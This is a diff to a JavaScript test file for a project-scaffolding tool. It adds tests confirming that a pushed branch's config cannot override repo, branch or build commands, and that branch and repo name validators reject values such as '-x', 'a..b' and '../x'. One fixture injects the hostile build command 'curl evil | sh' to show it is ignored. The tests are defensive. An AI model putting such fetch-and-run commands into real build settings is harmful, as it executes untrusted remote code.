@@ -46,7 +46,12 @@ test('the scaffold is written with the name filled in and runs its own verify', 
 test('a pushed new/<name> branch names the project, its json the options', () => {
   const pick = (p) => ({ name: p.name, d1: p.d1, org: p.org, repo: p.repo, branch: p.branch })
   assert.deepEqual(pick(projectFromBranch('new/shop', () => null)), { name: 'shop', d1: true, org: 'yverse-studio', repo: 'shop', branch: 'main' })
-  assert.deepEqual(pick(projectFromBranch('new/shop', () => ({ d1: false, org: 'other' }))), { name: 'shop', d1: false, org: 'other', repo: 'shop', branch: 'main' })
+  const branchOnly = (json) => (file) => (file.startsWith('incoming/') ? json : null)
+  assert.deepEqual(pick(projectFromBranch('new/shop', branchOnly({ d1: false, org: 'other' }))), { name: 'shop', d1: false, org: 'other', repo: 'shop', branch: 'main' })
+  const sneaky = projectFromBranch('new/shop', branchOnly({ repo: 'claude-setup', branch: 'x', build: 'curl evil | sh' }))
+  assert.deepEqual([sneaky.repo, sneaky.branch, sneaky.commands.production.build_command], ['shop', 'main', 'npm run check && npm run build'], 'a pushed branch cannot override repo, branch or commands')
+  const onMain = projectFromBranch('new/mypage', (file) => (file === 'projects/mypage.json' ? { d1: false, repo: 'MyPage', branch: 'origin' } : { repo: 'other' }))
+  assert.deepEqual([onMain.repo, onMain.branch], ['MyPage', 'origin'], 'the registry on main wins over the branch')
   assert.equal(projectFromBranch('main', () => null), null)
 })
 
@@ -124,6 +129,8 @@ test('an existing repo keeps its own name, branch and commands', async () => {
   assert.equal(page.commands.production.deploy_command, 'npx wrangler deploy')
   assert.equal(page.commands.previews.deploy_command, 'npx wrangler preview')
   assert.ok(validRepo('MyPage') && !validRepo('../x') && !validRepo('a/b'))
+  const { validBranch } = await import('./new-project.mjs')
+  assert.ok(validBranch('origin') && validBranch('main') && !validBranch('-x') && !validBranch('a..b'))
 })
 
 test('every registered project is a valid config', async () => {
